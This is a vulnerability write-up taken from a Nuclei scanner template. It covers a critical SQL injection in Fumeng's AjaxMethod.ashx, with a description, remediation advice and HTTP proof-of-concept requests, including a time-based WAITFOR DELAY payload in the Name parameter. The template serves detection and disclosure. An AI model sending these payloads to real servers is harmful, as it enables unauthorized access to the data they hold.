# Nuclei Template: Fumeng - SQL Injection
**Template ID:** fumengyun-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`fumengyun-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The Fumeng AjaxMethod.ashx file has an SQL injection vulnerability. Attackers can use this vulnerability to obtain server data.

## Impact
Successful exploitation could lead to unauthorized access to sensitive data.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

@timeout: 30s
GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
Host: {{Hostname}}

@timeout: 30s
GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Implement input validation and use parameterized queries to prevent SQL Injection attacks.

## References
- https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
